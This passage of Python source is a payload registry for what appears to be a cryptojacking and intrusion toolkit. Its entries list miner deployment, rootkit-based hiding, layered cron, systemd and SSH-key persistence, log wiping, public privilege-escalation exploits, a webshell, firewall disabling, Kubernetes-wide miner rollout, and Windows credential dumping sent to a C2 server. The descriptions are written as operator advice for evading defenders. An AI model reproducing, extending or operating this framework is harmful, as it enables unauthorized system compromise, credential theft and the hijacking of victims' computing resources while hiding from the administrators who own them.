            install_script=_STRATUM_INSTALL,
            run_script=_STRATUM_RUN,
            artifacts=["stratum_proxy.py", "run.sh"],
            tags=["miner", "stratum", "proxy"],
        ),
        Payload(
            id="metasploit",
            category="exploit",
            name="Metasploit Framework",
            description="Rapid7 Metasploit framework for authorized red-team exploitation and post-exploitation modules.",
            platforms=["linux-x64"],
            install_type="package",
            dependencies=["curl", "apt-get|dnf"],
            config_schema={
                "target_range": {"type": "string", "required": False, "default": "127.0.0.1"},
                "resource_script": {"type": "string", "required": False, "default": ""},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/metasploit"},
                "msf_url": {"type": "string", "required": False},
            },
            install_script=_METASPLOIT_INSTALL,
            run_script=_METASPLOIT_RUN,
            artifacts=["ssh_enum.rc", "exploit.rc"],
            tags=["exploit", "metasploit", "post"],
        ),
        Payload(
            id="upx",
            category="evasion",
            name="UPX Packer",
            description="Ultimate Packer for eXecutables: compresses ELF/PE/Mach-O binaries to hinder static analysis.",
            platforms=["linux-x64"],
            install_type="binary",
            dependencies=["curl", "tar", "xz"],
            config_schema={
                "input_file": {"type": "string", "required": True},
                "output_file": {"type": "string", "required": False},
                "args": {"type": "string", "required": False, "default": "--best -o /tmp/packed "},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/upx"},
                "arch": {"type": "string", "required": False, "default": "linux-amd64"},
                "expected_sha256": {"type": "string", "required": False, "default": ""},
            },
            install_script=_UPX_INSTALL,
            run_script=_UPX_RUN,
            artifacts=["upx"],
            tags=["evasion", "packer", "compression"],
        ),
        Payload(
            id="packers",
            category="evasion",
            name="Generic ELF Packer Harness",
            description="Shell-based self-extracting packer stub for ELF binaries, replaceable with a custom loader/crypter.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=["gzip", "xxd|base64"],
            config_schema={
                "input_file": {"type": "string", "required": True},
                "output_file": {"type": "string", "required": False},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/packers"},
            },
            install_script=_PACKERS_INSTALL,
            run_script=_PACKERS_RUN,
            artifacts=["pack.sh"],
            tags=["evasion", "packer", "elf"],
        ),
        Payload(
            id="obfuscators",
            category="evasion",
            name="Script String Obfuscator",
            description="Obfuscates string literals in shell/Python scripts to raise the cost of casual static analysis.",
            platforms=["linux-x64"],
            install_type="script",
            dependencies=["python3"],
            config_schema={
                "input_file": {"type": "string", "required": True},
                "output_file": {"type": "string", "required": False, "default": "/tmp/obfuscated.sh"},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/obfuscators"},
            },
            install_script=_OBFUSCATORS_INSTALL,
            run_script=_OBFUSCATORS_RUN,
            artifacts=["obfuscate_strings.py", "obfuscate.sh"],
            tags=["evasion", "obfuscation", "strings"],
        ),
        Payload(
            id="symbol_strip",
            category="evasion",
            name="Symbol Stripper",
            description="Strips debug symbols and section headers from ELF binaries to reduce analyst surface area.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=["binutils"],
            config_schema={
                "input_file": {"type": "string", "required": True},
                "output_file": {"type": "string", "required": False},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/strip"},
            },
            install_script=_SYMBOL_STRIP_INSTALL,
            run_script=_SYMBOL_STRIP_RUN,
            artifacts=["strip.sh"],
            tags=["evasion", "strip", "symbols"],
        ),
        Payload(
            id="anti_debug",
            category="evasion",
            name="Anti-Debug Shim",
            description="LD_PRELOAD-able shared object that calls PTRACE_TRACEME to detect and deter debuggers.",
            platforms=["linux-x64"],
            install_type="source",
            dependencies=["gcc"],
            config_schema={
                "target_command": {"type": "string", "required": True},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/anti_debug"},
            },
            install_script=_ANTI_DEBUG_INSTALL,
            run_script=_ANTI_DEBUG_RUN,
            artifacts=["anti_debug.c", "anti_debug.so"],
            tags=["evasion", "anti-debug", "ptrace"],
        ),
        Payload(
            id="anti_vm",
            category="evasion",
            name="Anti-VM Checker",
            description="Shell harness that inspects CPU, DMI, and dmesg indicators to detect virtualized analysis sandboxes.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=["grep", "dmesg"],
            config_schema={
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/anti_vm"},
            },
            install_script=_ANTI_VM_INSTALL,
            run_script=_ANTI_VM_RUN,
            artifacts=["anti_vm.sh"],
            tags=["evasion", "anti-vm", "sandbox"],
        ),
        # ----------------------------------------------------------------- #
        # Persistence payloads — what every real cryptojacker chains onto
        # the miner deploy. Without these a reboot loses the box and a
        # password change loses access.
        # ----------------------------------------------------------------- #
        Payload(
            id="kill_miners",
            category="evasion",
            name="Competing Miner Killer",
            description="Kills every known competing cryptojacker (xmrig/kdevtmpfsi/kinsing/kthrotlds/sysupdate) and "
                        "removes their cron/systemd persistence so they don't respawn. Run this BEFORE deploying your "
                        "own miner — leaving another botnet's miner running splits CPU and draws SOC attention.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=[],
            config_schema={},
            install_script=_KILL_MINERS_INSTALL,
            run_script=_KILL_MINERS_RUN,
            artifacts=[],
            tags=["persistence", "cleanup", "anti-botnet"],
        ),
        Payload(
            id="systemd_persist",
            category="evasion",
            name="Systemd Miner Persistence",
            description="Installs a systemd service that auto-restarts the miner on exit and reboots. The persistence "
                        "primitive every real cryptojacker uses — without it a reboot loses the box.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=["systemctl"],
            config_schema={
                "service_name": {"type": "string", "required": False, "default": "honeywatch-miner"},
                "run_user": {"type": "string", "required": False, "default": "root"},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/xmrig"},
                "cpu_quota": {"type": "string", "required": False, "default": "70%"},
                "nice": {"type": "string", "required": False, "default": "10"},
            },
            install_script=_SYSTEMD_PERSIST_INSTALL,
            run_script=_SYSTEMD_PERSIST_RUN,
            artifacts=["systemd unit"],
            tags=["persistence", "systemd", "survives-reboot"],
        ),
        Payload(
            id="cron_persist",
            category="evasion",
            name="Cron Miner Persistence",
            description="Cron-based miner re-launcher — the fallback for hosts without systemd (containers, old "
                        "distros, alpine). Re-launches the miner every N minutes if it isn't running.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=["crontab"],
            config_schema={
                "schedule": {"type": "string", "required": False, "default": "*/5 * * * *"},
                "run_user": {"type": "string", "required": False, "default": "root"},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/xmrig"},
            },
            install_script=_CRON_PERSIST_INSTALL,
            run_script=_CRON_PERSIST_RUN,
            artifacts=["crontab entry"],
            tags=["persistence", "cron", "fallback"],
        ),
        Payload(
            id="sshkey_backdoor",
            category="evasion",
            name="SSH Authorized Keys Backdoor",
            description="Installs the operator's public key into the popped user's authorized_keys so access survives "
                        "a password change. The second most common persistence primitive after cron.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=[],
            config_schema={
                "backdoor_key": {"type": "string", "required": True},
                "run_user": {"type": "string", "required": False, "default": "root"},
            },
            install_script=_SSHKEY_BACKDOOR_INSTALL,
            run_script=_SSHKEY_BACKDOOR_RUN,
            artifacts=["authorized_keys entry"],
            tags=["persistence", "backdoor", "ssh"],
        ),
        Payload(
            id="cleanup",
            category="evasion",
            name="Deploy Trace Cleanup",
            description="Wipes shell history, truncates auth/syslog/wtmp/lastlog, flushes journald, and "
                        "removes the honeywatch install log + dropper script. Run LAST in the evasion chain "
                        "after persistence is installed so the box carries no IR fingerprints tying it to "
                        "the deploy. Mirrors TeamTNT T1070.003 / Outlaw cleanup.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=[],
            config_schema={},
            install_script=_CLEANUP_INSTALL,
            run_script=_CLEANUP_RUN,
            artifacts=[],
            tags=["persistence", "cleanup", "anti-forensics"],
        ),
        # ----------------------------------------------------------------- #
        # Phase 6: Exploit payloads — local privilege escalation
        # ----------------------------------------------------------------- #
        Payload(
            id="privesc_sudo",
            category="exploit",
            name="Baron Samedit (CVE-2021-3156) sudo privesc",
            description="Sudo heap buffer overflow (CVE-2021-3156). Affects sudo 1.8.2-1.8.31p2, 1.9.0-1.9.5p1. "
                        "Gives root from any unprivileged local user. Downloads + compiles the public PoC.",
            platforms=["linux-x64"],
            install_type="source",
            dependencies=["python3", "curl"],
            config_schema={
                "run_user": {"type": "string", "required": False, "default": "root"},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/privesc_sudo"},
            },
            install_script=_PRIVESC_SUDO_INSTALL,
            run_script=_PRIVESC_SUDO_RUN,
            artifacts=["exploit.py"],
            tags=["exploit", "privesc", "sudo", "cve-2021-3156"],
        ),
        Payload(
            id="privesc_dirtypipe",
            category="exploit",
            name="Dirty Pipe (CVE-2022-0847) kernel privesc",
            description="Linux kernel pipe buffer flag overwrite (CVE-2022-0847). Affects kernels 5.8-5.16.10. "
                        "Gives root file writes — overwrite /etc/passwd, inject into SUID binaries.",
            platforms=["linux-x64"],
            install_type="source",
            dependencies=["gcc", "curl"],
            config_schema={
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/privesc_dirtypipe"},
            },
            install_script=_PRIVESC_DIRTY_PIPE_INSTALL,
            run_script=_PRIVESC_DIRTY_PIPE_RUN,
            artifacts=["dirtypipe.c", "dirtypipe"],
            tags=["exploit", "privesc", "kernel", "cve-2022-0847"],
        ),
        Payload(
            id="privesc_pwnkit",
            category="exploit",
            name="PwnKit (CVE-2021-4034) pkexec privesc",
            description="Polkit pkexec local privilege escalation (CVE-2021-4034). Affects all Polkit versions "
                        "since 2009. One of the most reliable privesc vectors — works on almost every Linux "
                        "desktop/server with pkexec installed.",
            platforms=["linux-x64"],
            install_type="source",
            dependencies=["gcc", "pkexec"],
            config_schema={
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/privesc_pwnkit"},
            },
            install_script=_PRIVESC_PWNKIT_INSTALL,
            run_script=_PRIVESC_PWNKIT_RUN,
            artifacts=["pwnkit.c", "pwnkit"],
            tags=["exploit", "privesc", "pkexec", "cve-2021-4034"],
        ),
        Payload(
            id="privesc_docker_escape",
            category="exploit",
            name="Docker Socket Escape",
            description="When /var/run/docker.sock is accessible (docker group or world-writable), mount the "
                        "host filesystem in a container and read/write as root. Full host root from a container. "
                        "Uses docker CLI when available, falls back to the socket API via curl.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=["curl"],
            config_schema={
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/privesc_docker"},
            },
            install_script=_PRIVESC_DOCKER_ESCAPE_INSTALL,
            run_script=_PRIVESC_DOCKER_ESCAPE_RUN,
            artifacts=[],
            tags=["exploit", "privesc", "docker", "container-escape"],
        ),
        Payload(
            id="privesc_cron_path",
            category="exploit",
            name="Cron PATH Hijack",
            description="Scans cron files for root cron jobs that run commands without full paths, then plants "
                        "a malicious binary earlier in $PATH to get root execution on the next cron cycle.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=[],
            config_schema={
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/privesc_cronpath"},
            },
            install_script=_PRIVESC_CRON_PATH_INSTALL,
            run_script=_PRIVESC_CRON_PATH_RUN,
            artifacts=[],
            tags=["exploit", "privesc", "cron", "path-hijack"],
        ),
        # ----------------------------------------------------------------- #
        # Phase 6: Persistence payloads — deeper vectors
        # ----------------------------------------------------------------- #
        Payload(
            id="web_shell_persist",
            category="evasion",
            name="Web Shell Persistence",
            description="Drops a minimal PHP webshell into a detected web root. Survives password changes and "
                        "reboots (as long as the web server stays up). Gives command execution without SSH.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=[],
            config_schema={
                "web_root": {"type": "string", "required": False, "default": "/var/www/html"},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/webshell"},
            },
            install_script=_WEB_SHELL_PERSIST_INSTALL,
            run_script=_WEB_SHELL_PERSIST_RUN,
            artifacts=[".config.php", ".htaccess"],
            tags=["persistence", "webshell", "php"],
        ),
        Payload(
            id="ld_preload_rootkit",
            category="evasion",
            name="LD_PRELOAD Rootkit",
            description="Compiles a shared object that hooks readdir(), open/openat, fopen, and readlink/readlinkat "
                        "to hide files AND processes matching any of a configurable pipe-separated list of patterns "
                        "(default hides the honeywatch install tree and the xmrig miner), then installs it "
                        "system-wide via /etc/ld.so.preload. A thread-local reentrancy guard prevents the hook from "
                        "recursing into itself. Hides the xmrig process from ps/top (via /proc readdir PID-skip + "
                        "ENOENT on direct opens/readlinks of /proc/<pid>/{stat,cmdline,exe,comm,...}), and the "
                        "install dir from ls/find. Mirrors the TeamTNT/Tg777 hiding technique.",
            platforms=["linux-x64"],
            install_type="source",
            dependencies=["gcc"],
            config_schema={
                "hide_pattern": {"type": "string", "required": False, "default": "honeywatch|xmrig"},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/ldpreload"},
            },
            install_script=_LD_PRELOAD_ROOTKIT_INSTALL,
            run_script=_LD_PRELOAD_ROOTKIT_RUN,
            artifacts=["rootkit.c", "rootkit.so"],
            tags=["persistence", "rootkit", "ld_preload", "hiding", "procfs", "anti-forensics"],
        ),
        Payload(
            id="scheduled_task_persist",
            category="evasion",
            name="Windows Scheduled Task Persistence",
            description="Creates a Windows Task Scheduler task that re-launches the miner on logon + every 30 "
                        "minutes. The Windows equivalent of systemd_persist. Only applies to Windows footholds.",
            platforms=["windows-x64"],
            install_type="script",
            dependencies=["schtasks"],
            config_schema={
                "task_name": {"type": "string", "required": False, "default": "honeywatch-miner"},
                "run_user": {"type": "string", "required": False, "default": "SYSTEM"},
                "install_dir": {"type": "string", "required": False, "default": "C:\\\\honeywatch"},
            },
            install_script=_SCHEDULED_TASK_PERSIST_INSTALL,
            run_script=_SCHEDULED_TASK_PERSIST_RUN,
            artifacts=["scheduled task"],
            tags=["persistence", "windows", "scheduled-task"],
        ),
        # ----------------------------------------------------------------- #
        # Phase 8+: Self-healing persistence — mutually-reinforcing watchdog
        # ----------------------------------------------------------------- #
        Payload(
            id="watchdog_persist",
            category="persist",
            name="Cron Watchdog Persistence",
            description="Installs a cron entry that re-spawns the miner if it dies. Checks every 3 minutes. "
                        "This is the second layer of persistence after the primary (systemd/cron). If an admin "
                        "kills the miner process, this cron entry re-launches it within 3 minutes.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=["crontab"],
            config_schema={
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/xmrig"},
                "target_ip": {"type": "string", "required": False, "default": ""},
                "target_port": {"type": "string", "required": False, "default": "22"},
            },
            install_script=_WATCHDOG_PERSIST_INSTALL,
            run_script=_WATCHDOG_PERSIST_RUN,
            artifacts=["crontab entry"],
            tags=["persistence", "cron", "watchdog", "self-healing"],
        ),
        Payload(
            id="mutual_watch",
            category="persist",
            name="Mutual Watch Persistence",
            description="Monitors primary persistence (cron/systemd) and re-installs it if removed. Creates "
                        "mutually-reinforcing persistence: the cron entry monitors the miner, and this script "
                        "monitors the cron entry. Remove one and the other re-creates it. The admin must remove "
                        "both simultaneously to defeat it.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=["crontab"],
            config_schema={
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/xmrig"},
                "service_name": {"type": "string", "required": False, "default": "honeywatch-miner"},
            },
            install_script=_MUTUAL_WATCH_INSTALL,
            run_script=_MUTUAL_WATCH_RUN,
            artifacts=["crontab entry"],
            tags=["persistence", "cron", "mutual-watch", "self-healing"],
        ),
        Payload(
            id="systemd_timer",
            category="persist",
            name="Systemd Timer Watchdog",
            description="Installs a systemd timer as the third layer of self-healing persistence. The timer fires "
                        "every 5 minutes and checks if the miner is running, re-spawning it if not. Harder to "
                        "detect than cron entries (doesn't show in `crontab -l`) and survives reboot. Combined "
                        "with systemd_persist (service) and cron_persist, this creates a three-layer "
                        "mutually-reinforcing persistence loop. Remove one layer and the other two re-create it.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=["systemctl"],
            config_schema={
                "service_name": {"type": "string", "required": False, "default": "honeywatch-miner"},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/xmrig"},
            },
            install_script=_SYSTEMD_TIMER_INSTALL,
            run_script=_SYSTEMD_TIMER_RUN,
            artifacts=["systemd timer unit", "systemd watchdog service"],
            tags=["persistence", "systemd", "timer", "watchdog", "self-healing"],
        ),
        # ----------------------------------------------------------------- #
        # Phase 8+: Anti-forensics and memory-only execution
        # ----------------------------------------------------------------- #
        Payload(
            id="forensics_cleanup",
            category="evasion",
            name="Anti-Forensics Cleanup",
            description="Timestomps deployed artifacts, spoofs process names, clears logs and history, suppresses "
                        "core dumps, vacuums journald, removes SSH session traces, and clears btmp. Run LAST in "
                        "the evasion chain after persistence is installed so all artifacts are on disk before "
                        "timestamps are adjusted. Mirrors TeamTNT T1070.003 / T1070.004.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=[],
            config_schema={
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/xmrig"},
            },
            install_script=_FORENSICS_CLEANUP_INSTALL,
            run_script=_FORENSICS_CLEANUP_RUN,
            artifacts=[],
            tags=["evasion", "anti-forensics", "timestomp", "log-tampering"],
        ),
        Payload(
            id="memfd_exec",
            category="evasion",
            name="Memory-Only Execution (memfd_create)",
            description="Deploys the miner binary into memory without writing it to persistent filesystem. Uses "
                        "memfd_create (Linux 3.17+) with a decoy kernel thread name (kworker/0:1, ksoftirqd/0, "
                        "rcu_sched) so /proc/PID/comm shows a real kernel thread. Falls back to /dev/shm (tmpfs, "
                        "cleared on reboot) if memfd_create is unavailable, then to disk-based deploy. The memfd "
                        "name is randomized per-operation via the memfd_name template variable.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=["python3", "curl"],
            config_schema={
                "pool": {"type": "string", "required": True},
                "wallet": {"type": "string", "required": True},
                "worker": {"type": "string", "required": False, "default": "honeywatch"},
                "threads": {"type": "integer", "required": False, "default": 0},
                "tls": {"type": "boolean", "required": False, "default": False},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/xmrig"},
                "arch": {"type": "string", "required": False, "default": "linux-x64"},
                "memfd_name": {"type": "string", "required": False, "default": "kworker/0:1"},
                "expected_sha256": {"type": "string", "required": False, "default": ""},
            },
            install_script=_MEMFD_EXEC_INSTALL,
            run_script=_MEMFD_EXEC_RUN,
            artifacts=["xmrig (memfd)"],
            tags=["evasion", "memfd", "memory-only", "anti-forensics"],
        ),
        # ----------------------------------------------------------------- #
        # K8s cluster compromise
        # ----------------------------------------------------------------- #
        Payload(
            id="k8s_daemonset",
            category="persist",
            name="Kubernetes DaemonSet Miner Deployment",
            description="Deploys the miner as a Kubernetes DaemonSet across every node in the cluster. "
                        "Uses the k8s service-account token or a recovered kubeconfig to authenticate against "
                        "the API server. A single k8s cluster with 100 nodes = 100 miners from one compromise. "
                        "The pod runs with hostPID and hostNetwork for full node access, and a privileged "
                        "container for container escape if needed.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=["curl"],
            config_schema={
                "k8s_token": {"type": "string", "required": True},
                "kube_api_server": {"type": "string", "required": True},
                "namespace": {"type": "string", "required": False, "default": "default"},
                "pool": {"type": "string", "required": True},
                "wallet": {"type": "string", "required": True},
                "worker": {"type": "string", "required": False, "default": "honeywatch"},
                "threads": {"type": "integer", "required": False, "default": 0},
                "tls": {"type": "boolean", "required": False, "default": False},
            },
            install_script=_K8S_DAEMONSET_INSTALL,
            run_script=_K8S_DAEMONSET_RUN,
            artifacts=["k8s DaemonSet manifest"],
            tags=["persistence", "k8s", "daemonset", "cluster", "lateral"],
        ),
        # ----------------------------------------------------------------- #
        # Firewall disabling
        # ----------------------------------------------------------------- #
        Payload(
            id="firewall_disable",
            category="evasion",
            name="Firewall Disabling",
            description="Flushes iptables/ip6tables/nftables rules and disables firewalld/ufw to ensure "
                        "outbound mining pool traffic and inbound C2 connections are unrestricted. Run "
                        "immediately after gaining root — a host with restrictive firewall rules would "
                        "block the miner's pool connection. Mirrors TeamTNT T1562.004.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=[],
            config_schema={},
            install_script=_FIREWALL_DISABLE_INSTALL,
            run_script=_FIREWALL_DISABLE_RUN,
            artifacts=[],
            tags=["evasion", "firewall", "iptables", "T1562.004"],
        ),
        # ----------------------------------------------------------------- #
        # CPU governor manipulation — thermal stealth
        # ----------------------------------------------------------------- #
        Payload(
            id="cpu_governor",
            category="evasion",
            name="CPU Governor Manipulation",
            description="Sets the CPU governor to powersave and caps max frequency at 80% to reduce "
                        "thermal footprint. Sustained 100% CPU heats the host — some datacenters "
                        "monitor CPU temperature as a cryptojacking signal. Capping frequency keeps "
                        "mining throughput acceptable while reducing thermal output. Mirrors T1562.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=[],
            config_schema={},
            install_script=_CPU_GOVERNOR_INSTALL,
            run_script=_CPU_GOVERNOR_RUN,
            artifacts=[],
            tags=["evasion", "cpu", "thermal", "stealth", "T1562"],
        ),
        # ----------------------------------------------------------------- #
        # Windows credential dumping
        # ----------------------------------------------------------------- #
        Payload(
            id="windows_cred_dump",
            category="evasion",
            name="Windows Credential Dump",
            description="Dumps Windows SAM and SYSTEM registry hives using built-in reg.exe (no "
                        "Mimikatz — avoids AV detection). Exfiltrates the hashes via curl to the C2 "
                        "/api/loot endpoint. Hashes can be cracked offline for lateral movement. "
                        "Mirrors T1003.001.",
            platforms=["windows-x64", "windows-x86"],
            install_type="script",
            dependencies=["reg", "curl"],
            config_schema={
                "c2_url": {"type": "string", "required": True},
                "api_token": {"type": "string", "required": True},
            },
            install_script=_WINDOWS_CRED_DUMP_INSTALL,
            run_script=_WINDOWS_CRED_DUMP_RUN,
            artifacts=["sam.save", "system.save"],
            tags=["evasion", "windows", "credentials", "sam", "T1003.001"],
        ),
        # ----------------------------------------------------------------- #
        # Cron-based C2 beacon
        # ----------------------------------------------------------------- #
        Payload(
            id="cron_beacon",
            category="persist",
            name="Cron-based C2 Beacon",
            description="Installs a cron-based callback that beacons the C2 controller on a configurable "
                        "schedule. This is a fallback when the primary worker process is killed — cron "
                        "re-downloads and re-launches the worker. The controller's /api/beacon endpoint "
                        "responds with a shell script to execute (task) or empty (no work). Uses /etc/cron.d/ "
                        "if writable (with chattr +ia for persistence), otherwise user crontab. Mirrors "
                        "TeamTNT's callback pattern.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=["curl"],
            config_schema={
                "c2_url": {"type": "string", "required": True},
                "api_token": {"type": "string", "required": True},
                "schedule": {"type": "string", "required": False, "default": "*/10 * * * *"},
                "beacon_user": {"type": "string", "required": False, "default": "root"},
            },
            install_script=_CRON_BEACON_INSTALL,
            run_script=_CRON_BEACON_RUN,
            artifacts=["crontab entry", "/etc/cron.d/hw_beacon"],
            tags=["persistence", "cron", "beacon", "c2", "fallback"],
        ),
        # ----------------------------------------------------------------- #
        # Web exploit chain
        # ----------------------------------------------------------------- #
        Payload(
            id="web_exploit",
            category="exploit",
            name="Web Service RCE Chain",
            description="Exploits common web services found during loot to gain remote code execution. "
                        "Targets: Confluence (CVE-2023-22515/22518 admin account creation), "
                        "GitLab (CVE-2021-22205 exiftool RCE via crafted image), "
                        "Nacos (default identity key bypass -> arbitrary admin creation), "
                        "WebLogic (CVE-2023-21839 JNDI injection probe). Expands attack "
                        "surface beyond SSH — a host resisting SSH spray may have a "
                        "vulnerable Confluence on port 8090.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=["curl"],
            config_schema={
                "target_url": {"type": "string", "required": True},
                "exploit_type": {"type": "string", "required": True},
                "callback_url": {"type": "string", "required": False, "default": ""},
                "callback_token": {"type": "string", "required": False, "default": ""},
            },
            install_script=_WEB_EXPLOIT_INSTALL,
            run_script=_WEB_EXPLOIT_RUN,
            artifacts=[],
            tags=["exploit", "web", "rce", "confluence", "gitlab", "nacos", "weblogic"],
        ),
    ]


# Public registry is built once at import time.
registry: dict[str, Payload] = {p.id: p for p in _payloads()}
PAYLOAD_IDS: tuple[str, ...] = tuple(registry.keys())
PAYLOAD_CATEGORIES: tuple[str, ...] = tuple(sorted({p.category for p in registry.values()}))


def get_payload(payload_id: str) -> Payload:
    """Return a payload by id, raising KeyError if unknown."""
    if payload_id not in registry:
        raise KeyError(f"unknown payload: {payload_id!r}")
    return registry[payload_id]


def list_payloads(category: str | None = None) -> list[Payload]:
    """Return all payloads, optionally filtered by category."""
    payloads = list(registry.values())
    if category is not None:
        payloads = [p for p in payloads if p.category == category]
    return payloads


def by_category() -> dict[str, list[Payload]]:
    """Return payloads grouped by category."""
    groups: dict[str, list[Payload]] = {}
    for p in registry.values():
        groups.setdefault(p.category, []).append(p)
    return groups
